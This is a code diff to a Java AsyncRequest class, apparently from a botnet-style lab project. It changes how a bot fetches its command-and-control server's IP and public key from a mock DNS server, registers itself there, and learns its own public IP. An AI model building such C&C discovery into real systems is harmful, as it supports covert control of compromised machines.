@@ -6,6 +6,7 @@ import com.google.common.reflect.TypeToken;
 import cs.sii.domain.Conversions;
 import cs.sii.domain.IP;
 import cs.sii.domain.Pairs;
+import javassist.compiler.ast.Pair;
 
 import org.apache.http.HttpResponse;
 import org.apache.http.client.HttpClient;
@@ -89,16 +90,16 @@ public class AsyncRequest {
 	}
 
 	//da valutare se devono essere asincroni
-	public IP getIpCommandAndControlFromDnsServer(String dnsUrl) {
-		IP requestIp=new IP("");
-		Type type = new TypeToken<IP>() {}.getType();
+	public Pairs<IP,PublicKey>  getIpCommandAndControlFromDnsServer(String dnsUrl) {
+		Pairs<IP,PublicKey> cec = new Pairs<>();
+		Type type = new TypeToken<Pairs<IP,PublicKey>>() {}.getType();
 		try {
-			requestIp=doGetJSON(dnsUrl,type);
+			cec=doGetJSON(dnsUrl,type);
 			
 		} catch (Exception e) {
 			System.err.println("Errore ricezione Ip da Mock Dns Server");
 		}
-		return requestIp;
+		return cec;
 	}
 
 	//da valutare se devono essere asincroni
@@ -124,7 +125,7 @@ public class AsyncRequest {
 	}
 	
 	
-	//TODO da modificare
+	//TODO aggiungere una nuova pairs<Pairs<IP,PK>, Signature>;
 	//da valutare se devono essere asincroni
 	public Boolean sendInfoToDnsServer(String dnsUrl,IP myIp,PublicKey myPublicKey){
 		Pairs<IP,PublicKey> data = new Pairs<>();
@@ -132,9 +133,9 @@ public class AsyncRequest {
 		data.setValue2(myPublicKey);
 		Boolean response=false;
 		Integer counter = 0;
-		while (counter <= REQNUMBER) {
+		while (counter <= REQNUMBER) {//while(!response)
 		try {
-			String url=HTTPS+dnsUrl+PORT+"/alter/";
+			String url=HTTPS+dnsUrl+PORT+"/alter";
 			response=restTemplate.postForObject(url, data,response.getClass());
 			return response;
 		} catch (Exception e) {
@@ -265,5 +266,10 @@ public class AsyncRequest {
 
 		this.timeoutSeconds = timeoutSeconds;
 	}
-	
+
+	public String askMyIpToAmazon() throws Exception {
+		
+		String amazing = "http://checkip.amazonaws.com/";
+		return doGet(amazing);
+	}	
 }
